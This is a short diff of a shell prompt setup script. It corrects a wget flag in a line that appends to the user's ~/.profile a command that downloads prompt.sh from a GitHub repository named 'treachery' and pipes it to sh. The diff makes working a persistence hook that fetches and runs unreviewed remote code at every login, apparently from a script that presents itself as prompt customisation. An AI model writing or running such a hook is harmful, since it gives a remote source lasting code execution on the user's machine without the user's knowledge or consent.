@@ -16,7 +16,7 @@ putrc() {
 	done
 }
 putrc "\nPS1=\"${PROMPT}\""
-echo -n 'sh -c "$(wget -q0 - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/prompt.sh)"' >>~/.profile
+echo -n 'sh -c "$(wget -qO - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/prompt.sh)"' >>~/.profile
 case "${SHELL}" in
 	"/bin/zsh")
 		source "${HOME}/.zshrc"
